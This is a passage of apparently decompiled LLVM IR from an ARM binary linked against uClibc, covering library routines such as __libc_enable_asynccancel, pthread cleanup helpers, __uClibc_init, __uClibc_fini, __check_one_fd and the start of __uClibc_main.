  %v1_11258 = inttoptr i32 %v0_11258.pre to i32*
  %v2_11258 = load i32, i32* %v1_11258, align 4
  %v3_1125c = icmp uge i32 %v2_11258, %v1_1125c.pre
  store i1 %v3_1125c, i1* %cpsr_c.global-to-local, align 1
  %v9_1125c = icmp eq i32 %v2_11258, %v1_1125c.pre
  br i1 %v9_1125c, label %dec_label_pc_11264, label %dec_label_pc_1127c

dec_label_pc_11278:                               ; preds = %dec_label_pc_11264
  %v0_11278 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1127c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_11248, %dec_label_pc_11264.dec_label_pc_11258_crit_edge, %dec_label_pc_11278
  %v0_1127c = phi i32 [ %v0_11278, %dec_label_pc_11278 ], [ %v2_1125824, %dec_label_pc_11248 ], [ %v2_11258, %dec_label_pc_11264.dec_label_pc_11258_crit_edge ]
  %v1_1127c = phi i32 [ %v0_11278, %dec_label_pc_11278 ], [ %v0_11248, %dec_label_pc_11248 ], [ %v1_1125c.pre, %dec_label_pc_11264.dec_label_pc_11258_crit_edge ]
  %v3_1127c = icmp uge i32 %v0_1127c, %v1_1127c
  store i1 %v3_1127c, i1* %cpsr_c.global-to-local, align 1
  %v9_1127c = icmp eq i32 %v0_1127c, %v1_1127c
  br i1 %v9_1127c, label %dec_label_pc_112a4.preheader, label %dec_label_pc_1127c.dec_label_pc_11248_crit_edge

dec_label_pc_1127c.dec_label_pc_11248_crit_edge:  ; preds = %dec_label_pc_1127c
  %v0_11254.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11248

dec_label_pc_112a4.preheader:                     ; preds = %dec_label_pc_1127c
  %v0_112a41 = load i32, i32* %r7.global-to-local, align 4
  %v1_112a42 = and i32 %v0_112a41, 12
  store i32 %v1_112a42, i32* @r3, align 4
  %v2_112a83 = icmp ugt i32 %v1_112a42, 3
  store i1 %v2_112a83, i1* %cpsr_c.global-to-local, align 1
  %v7_112a85 = icmp eq i32 %v1_112a42, 4
  br i1 %v7_112a85, label %dec_label_pc_11288.lr.ph, label %dec_label_pc_112a4.preheader.dec_label_pc_112b0.loopexit_crit_edge

dec_label_pc_112a4.preheader.dec_label_pc_112b0.loopexit_crit_edge: ; preds = %dec_label_pc_112a4.preheader
  %v1_112b4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112b0.loopexit

dec_label_pc_11288.lr.ph:                         ; preds = %dec_label_pc_112a4.preheader
  %v0_1128c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1128c = add i32 %v0_1128c.pre, 132
  %v2_112a0 = inttoptr i32 %v1_1128c to i32*
  br label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %dec_label_pc_11288.lr.ph, %dec_label_pc_11288
  %v0_11288 = phi i32 [ %v0_112a41, %dec_label_pc_11288.lr.ph ], [ %v3_112a0, %dec_label_pc_11288 ]
  store i32 %v0_11288, i32* @r2, align 4
  store i32 %v1_1128c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_112a0 = load i32, i32* %v2_112a0, align 4
  store i32 %v3_112a0, i32* %r7.global-to-local, align 4
  %v1_112a4 = and i32 %v3_112a0, 12
  store i32 %v1_112a4, i32* @r3, align 4
  %v7_112a8 = icmp eq i32 %v1_112a4, 4
  br i1 %v7_112a8, label %dec_label_pc_11288, label %dec_label_pc_112a4.dec_label_pc_112b0.loopexit_crit_edge

dec_label_pc_112a4.dec_label_pc_112b0.loopexit_crit_edge: ; preds = %dec_label_pc_11288
  %v2_112a8 = icmp ugt i32 %v1_112a4, 3
  store i1 %v2_112a8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_112b0.loopexit

dec_label_pc_112b0.loopexit:                      ; preds = %dec_label_pc_112a4.preheader.dec_label_pc_112b0.loopexit_crit_edge, %dec_label_pc_112a4.dec_label_pc_112b0.loopexit_crit_edge
  %v1_112b4.pre = phi i32 [ %v1_112b4.pre.pre, %dec_label_pc_112a4.preheader.dec_label_pc_112b0.loopexit_crit_edge ], [ %v1_1128c, %dec_label_pc_112a4.dec_label_pc_112b0.loopexit_crit_edge ]
  %v2_112b0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_112b0.loopexit, %entry
  %v1_112b4 = phi i32 [ %v1_112b4.pre, %dec_label_pc_112b0.loopexit ], [ %v0_11230, %entry ]
  %v2_112b0 = phi i32 [ %v2_112b0.pre, %dec_label_pc_112b0.loopexit ], [ %v3_11234, %entry ]
  store i32 %v2_112b0, i32* @r4, align 4
  ret i32 %v1_112b4

; uselistorder directives
  uselistorder i32 %v3_112a0, { 1, 2, 0 }
  uselistorder i32 %v1_1128c, { 0, 2, 1 }
  uselistorder i32 %v0_11278, { 1, 0 }
  uselistorder i32 %v1_1125c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11248, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_112b0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_11288, { 1, 0 }
  uselistorder label %dec_label_pc_1127c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11264, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_112b8 = load i32, i32* @r4, align 4
  store i32 %v3_112b8, i32* %stack_var_-24, align 4
  store i32 73264, i32* %r8.global-to-local, align 4
  %v0_112c0 = call i32 @__aeabi_read_tp()
  %v1_112c4 = add i32 %v0_112c0, -1036
  %v2_112c4 = inttoptr i32 %v1_112c4 to i32*
  %v3_112c4 = load i32, i32* %v2_112c4, align 4
  store i32 %v3_112c4, i32* %r6.global-to-local, align 4
  %v1_112c8 = add i32 %v0_112c0, -1168
  store i32 %v1_112c8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r8.global-to-local, align 4
  %v1_112d046 = or i32 %v3_112c4, 2
  store i32 %v1_112d046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_112d449 = icmp eq i32 %v1_112d046, %v3_112c4
  br i1 %v9_112d449, label %dec_label_pc_11380, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %entry, %bb.dec_label_pc_112dc_crit_edge
  %v0_112e0 = phi i32 [ %v0_112e0.pre, %bb.dec_label_pc_112dc_crit_edge ], [ %v1_112c8, %entry ]
  %v1_112d051 = phi i32 [ %v1_112d0, %bb.dec_label_pc_112dc_crit_edge ], [ %v1_112d046, %entry ]
  %v0_112e450 = phi i32 [ %v1_11310, %bb.dec_label_pc_112dc_crit_edge ], [ %v3_112c4, %entry ]
  store i32 %v1_112d051, i32* @r1, align 4
  %v1_112e0 = add i32 %v0_112e0, 132
  store i32 %v1_112e0, i32* %r2.global-to-local, align 4
  store i32 %v0_112e450, i32* %r4.global-to-local, align 4
  %v1_112e834 = inttoptr i32 %v1_112e0 to i32*
  %v2_112e835 = load i32, i32* %v1_112e834, align 4
  store i32 %v2_112e835, i32* @r3, align 4
  %v3_112ec37 = icmp uge i32 %v2_112e835, %v0_112e450
  store i1 %v3_112ec37, i1* %cpsr_c.global-to-local, align 1
  %v9_112ec43 = icmp eq i32 %v2_112e835, %v0_112e450
  br i1 %v9_112ec43, label %dec_label_pc_112f4, label %dec_label_pc_1130c

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112dc, %dec_label_pc_112f4.dec_label_pc_112e8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_11304 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11304, label %dec_label_pc_11308, label %dec_label_pc_112f4.dec_label_pc_112e8_crit_edge

dec_label_pc_112f4.dec_label_pc_112e8_crit_edge:  ; preds = %dec_label_pc_112f4
  %v0_112e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_112ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_112e8 = inttoptr i32 %v0_112e8.pre to i32*
  %v2_112e8 = load i32, i32* %v1_112e8, align 4
  store i32 %v2_112e8, i32* @r3, align 4
  %v3_112ec = icmp uge i32 %v2_112e8, %v1_112ec.pre
  store i1 %v3_112ec, i1* %cpsr_c.global-to-local, align 1
  %v9_112ec = icmp eq i32 %v2_112e8, %v1_112ec.pre
  br i1 %v9_112ec, label %dec_label_pc_112f4, label %dec_label_pc_1130c

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f4
  %v0_11308 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11308, i32* @r3, align 4
  br label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112dc, %dec_label_pc_112f4.dec_label_pc_112e8_crit_edge, %dec_label_pc_11308
  %v1_11310 = phi i32 [ %v0_11308, %dec_label_pc_11308 ], [ %v2_112e835, %dec_label_pc_112dc ], [ %v2_112e8, %dec_label_pc_112f4.dec_label_pc_112e8_crit_edge ]
  %v1_1130c = load i32, i32* %r6.global-to-local, align 4
  %v3_1130c = icmp uge i32 %v1_11310, %v1_1130c
  store i1 %v3_1130c, i1* %cpsr_c.global-to-local, align 1
  %v9_1130c = icmp eq i32 %v1_11310, %v1_1130c
  br i1 %v9_1130c, label %dec_label_pc_11318, label %bb

bb:                                               ; preds = %dec_label_pc_1130c
  store i32 %v1_11310, i32* %r6.global-to-local, align 4
  %v1_112d0 = or i32 %v1_11310, 2
  store i32 %v1_112d0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_112d4 = icmp eq i32 %v1_112d0, %v1_11310
  br i1 %v9_112d4, label %dec_label_pc_11380, label %bb.dec_label_pc_112dc_crit_edge

bb.dec_label_pc_112dc_crit_edge:                  ; preds = %bb
  %v0_112e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_112dc

dec_label_pc_11318:                               ; preds = %dec_label_pc_1130c
  %v0_11318 = load i32, i32* %r5.global-to-local, align 4
  %v1_11318 = and i32 %v0_11318, -69
  store i32 %v1_11318, i32* @r3, align 4
  %v2_1131c = icmp ugt i32 %v1_11318, 9
  store i1 %v2_1131c, i1* %cpsr_c.global-to-local, align 1
  %v7_1131c = icmp eq i32 %v1_11318, 10
  br i1 %v7_1131c, label %dec_label_pc_11324, label %dec_label_pc_11380

dec_label_pc_11324:                               ; preds = %dec_label_pc_11318
  %v1_11328 = load i32, i32* %r7.global-to-local, align 4
  %v2_11328 = add i32 %v1_11328, 544
  %v3_11328 = inttoptr i32 %v2_11328 to i32*
  store i32 -1, i32* %v3_11328, align 4
  %v0_1132c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1132c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11330

dec_label_pc_11330:                               ; preds = %dec_label_pc_11364.dec_label_pc_11330_crit_edge, %dec_label_pc_11324
  %v0_11334 = phi i32 [ %v0_11334.pre, %dec_label_pc_11364.dec_label_pc_11330_crit_edge ], [ %v0_1132c, %dec_label_pc_11324 ]
  %v0_11330 = load i32, i32* %r7.global-to-local, align 4
  %v1_11330 = add i32 %v0_11330, 132
  %v2_11330 = inttoptr i32 %v1_11330 to i32*
  %v3_11330 = load i32, i32* %v2_11330, align 4
  store i32 %v0_11334, i32* %r2.global-to-local, align 4
  store i32 %v3_11330, i32* %r4.global-to-local, align 4
  %v1_1133c = or i32 %v3_11330, 16
  store i32 %v1_1133c, i32* @r1, align 4
  %v1_1134022 = inttoptr i32 %v0_11334 to i32*
  %v2_1134023 = load i32, i32* %v1_1134022, align 4
  %v3_1134425 = icmp uge i32 %v2_1134023, %v3_11330
  store i1 %v3_1134425, i1* %cpsr_c.global-to-local, align 1
  %v9_1134431 = icmp eq i32 %v2_1134023, %v3_11330
  br i1 %v9_1134431, label %dec_label_pc_1134c, label %dec_label_pc_11364

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11330, %dec_label_pc_1134c.dec_label_pc_11340_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1135c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1135c, label %dec_label_pc_11360, label %dec_label_pc_1134c.dec_label_pc_11340_crit_edge

dec_label_pc_1134c.dec_label_pc_11340_crit_edge:  ; preds = %dec_label_pc_1134c
  %v0_11340.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11344.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11340 = inttoptr i32 %v0_11340.pre to i32*
  %v2_11340 = load i32, i32* %v1_11340, align 4
  %v3_11344 = icmp uge i32 %v2_11340, %v1_11344.pre
  store i1 %v3_11344, i1* %cpsr_c.global-to-local, align 1
  %v9_11344 = icmp eq i32 %v2_11340, %v1_11344.pre
  br i1 %v9_11344, label %dec_label_pc_1134c, label %dec_label_pc_11364

dec_label_pc_11360:                               ; preds = %dec_label_pc_1134c
  %v0_11360 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11364

dec_label_pc_11364:                               ; preds = %dec_label_pc_11330, %dec_label_pc_1134c.dec_label_pc_11340_crit_edge, %dec_label_pc_11360
  %v0_11364 = phi i32 [ %v0_11360, %dec_label_pc_11360 ], [ %v2_1134023, %dec_label_pc_11330 ], [ %v2_11340, %dec_label_pc_1134c.dec_label_pc_11340_crit_edge ]
  %v1_11364 = phi i32 [ %v0_11360, %dec_label_pc_11360 ], [ %v3_11330, %dec_label_pc_11330 ], [ %v1_11344.pre, %dec_label_pc_1134c.dec_label_pc_11340_crit_edge ]
  %v3_11364 = icmp uge i32 %v0_11364, %v1_11364
  store i1 %v3_11364, i1* %cpsr_c.global-to-local, align 1
  %v9_11364 = icmp eq i32 %v0_11364, %v1_11364
  br i1 %v9_11364, label %dec_label_pc_1136c, label %dec_label_pc_11364.dec_label_pc_11330_crit_edge

dec_label_pc_11364.dec_label_pc_11330_crit_edge:  ; preds = %dec_label_pc_11364
  %v0_11334.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11330

dec_label_pc_1136c:                               ; preds = %dec_label_pc_11364
  store i32 124, i32* @r3, align 4
  %v0_11374 = load i32, i32* %r8.global-to-local, align 4
  %v2_11374 = add i32 %v0_11374, 124
  %v3_11374 = inttoptr i32 %v2_11374 to i32*
  %v4_11374 = load i32, i32* %v3_11374, align 4
  store i32 %v4_11374, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11374)
  %v0_11380.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11380

dec_label_pc_11380:                               ; preds = %entry, %bb, %dec_label_pc_11318, %dec_label_pc_1136c
  %v0_11380 = phi i32 [ %v1_11310, %dec_label_pc_11318 ], [ %v0_11380.pre, %dec_label_pc_1136c ], [ %v3_112c4, %entry ], [ %v1_11310, %bb ]
  %v2_11384 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11384, i32* @r4, align 4
  ret i32 %v0_11380

; uselistorder directives
  uselistorder i32 %v0_11360, { 1, 0 }
  uselistorder i32 %v1_11344.pre, { 0, 2, 1 }
  uselistorder i32 %v1_112d0, { 1, 2, 0 }
  uselistorder i32 %v1_1130c, { 1, 0 }
  uselistorder i32 %v1_11310, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_112ec.pre, { 1, 0 }
  uselistorder i32 %v0_112e450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 2, 6, 10, 7, 9, 8, 0, 1 }
  uselistorder i32 124, { 1, 2, 3, 0 }
  uselistorder i32 132, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11380, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11364, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1134c, { 1, 0 }
  uselistorder label %dec_label_pc_1130c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_112f4, { 1, 0 }
  uselistorder label %dec_label_pc_112dc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_113a4 = add i32 %tmp, 4
  %v4_113a4 = inttoptr i32 %v3_113a4 to i32*
  store i32 %arg3, i32* %v4_113a4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_113b0 = icmp eq i32 %arg2, 0
  br i1 %v2_113b0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_113bc = add i32 %tmp, 4
  %v3_113bc = inttoptr i32 %v2_113bc to i32*
  %v4_113bc = load i32, i32* %v3_113bc, align 4
  store i32 %v4_113bc, i32* %r0.global-to-local, align 4
  %v3_113c0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_113c0, %bb ], [ undef, %entry ]
  %v2_113c8 = xor i1 %v2_113b0, true
  call void @__pseudo_cond_branch(i1 %v2_113c8, i32 %.02)
  %v1_113d4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_113d4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_113fc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_113d8 = load i32, i32* @r4, align 4
  store i32 %v3_113d8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_113fc

dec_label_pc_113fc:                               ; preds = %dec_label_pc_113fc.dec_label_pc_113fc_crit_edge, %dec_label_pc_113fc.lr.ph
  %v1_113fc = phi i32 [ %v1_11408, %dec_label_pc_113fc.dec_label_pc_113fc_crit_edge ], [ 0, %dec_label_pc_113fc.lr.ph ]
  %v0_113fc = phi i32 [ %v0_113fc.pre, %dec_label_pc_113fc.dec_label_pc_113fc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -8), %dec_label_pc_113fc.lr.ph ]
  %v4_113fc = mul i32 %v1_113fc, 4
  %v5_113fc = add i32 %v4_113fc, %v0_113fc
  %v6_113fc = inttoptr i32 %v5_113fc to i32*
  %v7_113fc = load i32, i32* %v6_113fc, align 4
  call void @__pseudo_branch(i32 %v7_113fc)
  %v0_11408 = load i32, i32* %r4.global-to-local, align 4
  %v1_11408 = add i32 %v0_11408, -1
  store i32 %v1_11408, i32* %r4.global-to-local, align 4
  %v2_11408 = icmp eq i32 %v0_11408, 0
  br i1 %v2_11408, label %dec_label_pc_11410, label %dec_label_pc_113fc.dec_label_pc_113fc_crit_edge

dec_label_pc_113fc.dec_label_pc_113fc_crit_edge:  ; preds = %dec_label_pc_113fc
  %v0_113fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_113fc

dec_label_pc_11410:                               ; preds = %dec_label_pc_113fc
  %v0_11414.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_11414 = add i32 %v0_11414.pre, 11968
  %v3_11414 = inttoptr i32 %v2_11414 to i32*
  %v4_11414 = load i32, i32* %v3_11414, align 4
  %v2_11418 = icmp eq i32 %v4_11414, 0
  br i1 %v2_11418, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_11410
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_11410, %bb
  %v2_11420 = xor i1 %v2_11418, true
  call void @__pseudo_cond_branch(i1 %v2_11420, i32 %v4_11414)
  %v0_11428 = load i32, i32* %r5.global-to-local, align 4
  %v2_11428 = add i32 %v0_11428, 11972
  %v3_11428 = inttoptr i32 %v2_11428 to i32*
  %v4_11428 = load i32, i32* %v3_11428, align 4
  %v2_1142c = icmp eq i32 %v4_11428, 0
  br i1 %v2_1142c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_11434 = xor i1 %v2_1142c, true
  call void @__pseudo_cond_branch(i1 %v2_11434, i32 %v4_11428)
  %v2_11438 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11438, i32* %r4.global-to-local, align 4
  %v1_1143c = load i32, i32* @r0, align 4
  ret i32 %v1_1143c

; uselistorder directives
  uselistorder i32 %v1_11408, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_11454 = load i32, i32* @r4, align 4
  %v6_11454 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_11468 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_11470 = icmp eq i32 %v2_11468, -1
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r3, align 4
  br i1 %v3_11470, label %dec_label_pc_1147c, label %dec_label_pc_11494

dec_label_pc_1147c:                               ; preds = %entry
  %v0_11480 = load i32, i32* @r5, align 4
  %v2_11488 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -34912), i32 %v0_11480)
  %v1_1148c = load i32, i32* @r4, align 4
  %v1_11490 = icmp ne i32 %v2_11488, %v1_1148c
  call void @__pseudo_cond_branch(i1 %v1_11490, i32 ptrtoint (i32* @global_var_f634.463 to i32))
  br label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %entry, %dec_label_pc_1147c
  %v1_1149c = phi i32 [ %v2_11468, %entry ], [ %v2_11488, %dec_label_pc_1147c ]
  store i32 %v3_11454, i32* @r4, align 4
  store i32 %v6_11454, i32* @r5, align 4
  ret i32 %v1_1149c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11494, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114a8 = load i32, i32* @r4, align 4
  store i32 %v3_114a8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r4.global-to-local, align 4
  %v4_114b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 156) to i32*), align 4
  %v1_114bc = inttoptr i32 %v4_114b8 to i32*
  %v2_114bc = load i32, i32* %v1_114bc, align 4
  %v2_114c0 = icmp eq i32 %v2_114bc, 0
  br i1 %v2_114c0, label %dec_label_pc_114c8, label %dec_label_pc_114ec

dec_label_pc_114c8:                               ; preds = %entry
  store i32 4096, i32* %v1_114bc, align 4
  %v0_114d0 = call i32 @__pthread_initialize_minimal()
  %v0_114d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_114d8 = add i32 %v0_114d8, -95716
  %v2_114e0 = icmp eq i32 %v2_114d8, 0
  br i1 %v2_114e0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_114c8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_114c8, %bb
  %v2_114e8 = xor i1 %v2_114e0, true
  call void @__pseudo_cond_branch(i1 %v2_114e8, i32 %v2_114d8)
  %v2_114ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %entry, %bb4
  %v2_114ec = phi i32 [ %v2_114ec.pre, %bb4 ], [ %v3_114a8, %entry ]
  %.0 = phi i32 [ %v0_114d0, %bb4 ], [ undef, %entry ]
  store i32 %v2_114ec, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_114ec, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i64* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp67 = call i32 @__decompiler_undefined_function_0()
  %tmp68 = call i32 @__decompiler_undefined_function_0()
  %tmp69 = call i32 @__decompiler_undefined_function_0()
  %tmp70 = call i32 @__decompiler_undefined_function_0()
  %tmp71 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 72676, i32* %r4.global-to-local, align 4
  %v1_1150c = add i32 %arg3, 4
  store i32 %v1_1150c, i32* %ip.global-to-local, align 4
  %v1_11510 = inttoptr i32 %arg3 to i32*
  %v2_11510 = load i32, i32* %v1_11510, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r4.global-to-local, align 4
  %v4_1151c = mul i32 %tmp, 4
  store i32 %v4_1151c, i32* @r7, align 4
  %v4_11524 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 24) to i32*), align 4
  store i32 %v4_11524, i32* %r1.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v2_1152c = add i32 %v4_1151c, %v1_1150c
  store i32 %v2_1152c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %stack_var_-416, align 4
  %v4_11534 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 60) to i32*), align 4
  store i32 %v4_11534, i32* %r4.global-to-local, align 4
  %v3_11538 = icmp uge i32 %v2_1152c, %v2_11510
  store i1 %v3_11538, i1* %cpsr_c.global-to-local, align 1
  %v9_11538 = icmp eq i32 %v2_1152c, %v2_11510
  store i1 %v9_11538, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_11540 = inttoptr i32 %v4_11534 to i32*
  store i32 %v2_1152c, i32* %v2_11540, align 4
  br i1 %v9_11538, label %bb, label %bb80

bb:                                               ; preds = %entry
  store i32 %arg3, i32* %ip.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %entry, %bb
  %v0_11548 = load i32, i32* %r2.global-to-local, align 4
  %v1_11548 = load i32, i32* %r1.global-to-local, align 4
  %v2_11548 = inttoptr i32 %v1_11548 to i32*
  store i32 %v0_11548, i32* %v2_11548, align 4
  %v2_1154c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1154c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 11972, i32* %r2.global-to-local, align 4
  %v0_11558 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11558, i32* @r6, align 4
  br i1 %v9_11538, label %bb81, label %.thread57

.thread57:                                        ; preds = %bb80
  %v3_1156058 = add i32 %v2_1154c, 11972
  %v4_1156059 = inttoptr i32 %v3_1156058 to i32*
  store i32 %arg6, i32* %v4_1156059, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb82

bb81:                                             ; preds = %bb80
  %v1_1155c = load i32, i32* %ip.global-to-local, align 4
  %v2_1155c = load i32, i32* @r7, align 4
  %v3_1155c = add i32 %v2_1155c, %v1_1155c
  store i32 %v3_1155c, i32* %r3.global-to-local, align 4
  %v3_1156055 = add i32 %v2_1154c, 11972
  %v4_1156056 = inttoptr i32 %v3_1156055 to i32*
